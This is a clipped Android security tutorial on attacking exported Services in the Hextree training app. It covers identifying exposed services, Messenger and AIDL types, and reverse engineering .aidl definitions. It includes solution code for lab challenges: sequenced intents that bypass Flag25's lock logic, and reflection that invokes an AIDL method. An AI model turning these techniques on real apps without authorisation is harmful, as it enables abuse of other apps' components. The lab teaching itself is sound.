---
title: Android Services
source: https://0xk3r0.github.io/posts/android-services/
source_host: 0xk3r0.github.io
clip_date: 2026-11-02T10:42:33+08:00
trace_id: c24938aa-0bb3-4af1-b113-7eca4a1745e6
content_hash: c7a7d241aaf633d8479925c4eff2f75dc30dee3cedc367bdd0e57f884ac7fa1d
status: synced
tags:
  - Android逆向
  - 漏洞分析
series: null
feed_source: Kyrillos Nady·iOS/Android RE
ai_summary: TL;DR：导出的 Android Service 是重要攻击面，可在 Manifest 中识别，并通过 Intent、Messenger 或动态加载 AIDL Stub 与其交互发掘漏洞。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40c75244-d011-8170-b5ef-c9e63a9e6efa
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：导出的 Android Service 是重要攻击面，可在 Manifest 中识别，并通过 Intent、Messenger 或动态加载 AIDL Stub 与其交互发掘漏洞。
> 
> - **识别方式：** `android:exported="true"` 且带 intent-filter 的 `<service>` 即为暴露服务；带 `BIND_JOB_SERVICE` 权限的 JobScheduler 服务无法直接交互，审计时通常可忽略。
> - **onStartCommand 攻击面：** 非 bind 服务的核心逻辑在 `onStartCommand()` 中处理外部传入的 Intent；Flag25 要求按 UNLOCK1→UNLOCK2→UNLOCK3 顺序触发且依赖内部锁状态，错序会 resetLocks，可用 Handler.postDelayed 以 2 秒、5 秒间隔依次 startService 绕过。
> - **服务类型判定：** 看 `onBind()`——返回 null 或抛异常为不可绑定；返回内部 LocalBinder 命名的 Binder 属仅内部可用；返回 `Messenger.getBinder()` 则为消息型服务，攻击者可完全控制 `handleMessage()` 收到的 Message。
> - **AIDL 逆向三步：** `onBind()` 返回 `.Stub` 即 AIDL 服务；从 `DESCRIPTOR` 变量取原始包路径与 .aidl 文件名、由带 `throws RemoteException` 的接口方法推方法签名、用 `TRANSACTION_` 整数还原原始方法顺序。
> - **免写 .aidl 的交互技巧：** 用 `getForeignClassLoader` 从目标 App 动态加载接口类，反射遍历内部类找到 Stub、调用 `asInterface(IBinder)` 后直接 invoke 目标方法（如 `openFlag()`），无需关心方法顺序与包名。

## Identify Exposed Services

Exposed [Services](https://developer.android.com/develop/background-work/services) offer another interesting threat surface for applications and in this course we will learn what it is about.

-   Activity: Runs in the foreground and renders the UI
-   Broadcast Receiver: Runs in the background to execute a minimal task
-   Service: Executes long running tasks in the background

Services can be used for various tasks such as downloads or uploads. But they are also involved in things like [media playback](https://developer.android.com/media/media3).

Services can be easily identified in the `AndroidManifest.xml`

**AndroidManifest.xml**

```xml
<service android:name="io.example.services.MyService" android:enabled="true" android:exported="true">
  <intent-filter>
    <action android:name="io.example.START"/>
  </intent-filter>
</service>
```

## Job Service

A very common service you might see exposed is an [Android Job Scheduler](https://developer.android.com/reference/android/app/job/JobScheduler) service. However due to the `android.permission.BIND_JOB_SERVICE` permission this service cannot be directly interacted with and can usually be ignored when hunting for bugs.

**AndroidManifest.xml**

```xml
<service 
android:name=".MyJobService"
  android:permission="android.permission.BIND_JOB_SERVICE"
  android:exported="true">
</service>
```

* * *

## Starting a Service

Starting a Service is very similar to starting an Activity. First an Intent is prepared and then sent using `startService()`:

```java
Intent intent = new Intent("io.example.START");
intent.setClassName("io.hextree.example",
                    "io.hextree.example.services.MyService");
startService(intent);
```

You can practice starting services using the Services related challenges of the Intent Attack Surface app.

## Service Implementation

On the receiving side the main threat surface is exposed via the `onStartCommand()` method which gets passed in the Intent. Here it depends on what the developer implemented whether there are issues or not.

Try to reverse engineer the Flag25 `onStartCommand()` implementation to figure out how to reach the `success()` function.

```jsx
if (intent != null) {
           if (intent.getAction().equals("io.hextree.services.UNLOCK1")) {
               this.lock1 = true;
           }
           if (intent.getAction().equals("io.hextree.services.UNLOCK2")) {
               if (this.lock1) {
                   this.lock2 = true;
               } else {
                   resetLocks();
               }
           }
           if (intent.getAction().equals("io.hextree.services.UNLOCK3")) {
               if (this.lock2) {
                   this.lock3 = true;
               } else {
                   resetLocks();
               }
           }
           if (this.lock1 && this.lock2 && this.lock3) {
               success();
               resetLocks();
           }
       }
```

Solve by Handler:

```jsx
Handler handler = new Handler();
 Intent intent1 = new Intent();
 intent1.setClassName("io.hextree.attacksurface",
         "io.hextree.attacksurface.services.Flag25Service");
 intent1.setAction("io.hextree.services.UNLOCK1");
 startService(intent1);

 handler.postDelayed(() -> {
     Intent intent2 = new Intent();
     intent2.setClassName("io.hextree.attacksurface",
             "io.hextree.attacksurface.services.Flag25Service");
     intent2.setAction("io.hextree.services.UNLOCK2");
     startService(intent2);
 }, 2000);
 handler.postDelayed(() -> {
     Intent intent3 = new Intent();
     intent3.setClassName("io.hextree.attacksurface",
             "io.hextree.attacksurface.services.Flag25Service");
     intent3.setAction("io.hextree.services.UNLOCK3");
     startService(intent3);
 }, 5000);
```

* * *

## Bindable vs. Non-Bindable services

There are actually two types of Services. Services that just get started to execute something in the background, and so called [bound Services](https://developer.android.com/develop/background-work/services/bound-services) where an app can establish a connection and continuously exchange data with the other app.

* * *

## Identify Non-bindable Services

After identifying an exposed Service in the android manifest, the next step should be looking at the `onBind()` method to determine if the service can be bound to or not.

When the `onBind()` method returns nothing or even throws an exception, then the service definetly cannot be bount to.

```java
@Override // android.app.Service
public IBinder onBind(Intent intent) {
    throw new UnsupportedOperationException("Not yet implemented");
}
```

## LocalService

There are also services where the `onBind()` method returns something, but it’s only an internally bindable service, thus from our perspective it’s a non-bindable service. These kind of services can usually be recognized by naming convention of “LocalBinder”.

* * *

## Message Handler Service

The “message handler” pattern is a typical kind of service implemented with the [`Messenger`](https://developer.android.com/reference/android/os/Messenger) class.

A messenger service can easily be recognised by looking at the `onBind()` method that returns a IBinder object created from the Messenger class.

```java
public class MyMessageService extends Service {
    public static final int MSG_SUCCESS = 42;
    final Messenger messenger = new Messenger(new IncomingHandler(Looper.getMainLooper()));

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return this.messenger.getBinder();
    }

    class IncomingHandler extends Handler {

        IncomingHandler(Looper looper) {
            super(looper);
        }

        @Override // android.os.Handler
        public void handleMessage(Message message) {
            if (message.what == 42) {
                // ...
            } else {
                super.handleMessage(message);
            }
        }
    }
}
```

The inline class extending [`Handler`](https://developer.android.com/reference/android/os/Handler) is contains a `handleMessage()` method that implements the actual service logic. The attacker can control the `Message` coming in.

* * *

## Identify AIDL Service

Services based on [AIDL](https://developer.android.com/develop/background-work/services/aidl) (Android Interface Definition Language) can be easily recognised by looking at the `onBind()` method that returns some kind of `.Stub` binder.

These ervices are based on AIDL files, which look similar to Java, but they are written in the “Android Interface Definition Language”.

**IFlag28Interface.aidl**

```java
package io.hextree.attacksurface.services;

interface IFlag28Interface {
    boolean openFlag();
}
```

During compilation this.aidl definition is then translated into an actual.java class that implements the low-level binder code to interact with the service.

When we want to interact with such a service we probably want to reverse engineer the original.aidl file.

* * *

## Reverse Engineering.aidl Definitions

When you see `.Stub()` related code inside a Service implementation, we probably have an AIDL service. To reverse engineer the original.aidl code, we can look into the generated service interface code.

1.  Look for the `DESCRIPTOR` variable, as it contains the original package path and.aidl filename
2.  The AIDL methods can be derived from the interface methods with the `throws RemoteException`
3.  The original method order is shown by the `TRANSACTION_` integers

* * *

## Audit Exposed AIDL Functionality

Now that we can reverse engineer an.aidl definition, let’s see how we can find the implemented logic that can be reached with it.

To do that we can explore how the two apps below use a service to implement a backup mechanism.

* * *

## Bind to AIDL Service with ClassLoader

Adding an.aidl file to your own project can be annoying. Another method that appears more complex at first, is actually quite convenient. By loading the class directly from the target app, we can just invoke the functions we need and do not have to bother about method order or package names.

Here is an example code snippet to dynamically load the `IFlag28Interface` interface class from the `io.hextree.attacksurface` app, and invoke the `openFlag()` method through the service.

**Remote.Stub() Class Loader**

```java
ServiceConnection mConnection = new ServiceConnection() {
    @Overridepublic void onServiceConnected(ComponentName name, IBinder service) {
        // Load the class dynamically
        ClassLoader classLoader = getForeignClassLoader(Flag28Activity.this, "io.hextree.attacksurface");
        Class<?> iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");

        Class<?> stubClass = null;
        for (Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()) {
            if (innerClass.getSimpleName().equals("Stub")) {
                stubClass = innerClass;
                break;
            }
        }

        // Get the asInterface method
        Method asInterfaceMethod = stubClass.getDeclaredMethod("asInterface", IBinder.class);

        // Invoke the asInterface method to get the instance of IRemoteService
        Object iRemoteService = asInterfaceMethod.invoke(null, service);

        // Call the init method and get the returned string
        Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod("openFlag");
        boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService);
    }
}
```

**THANKS FOR READING ❤️**
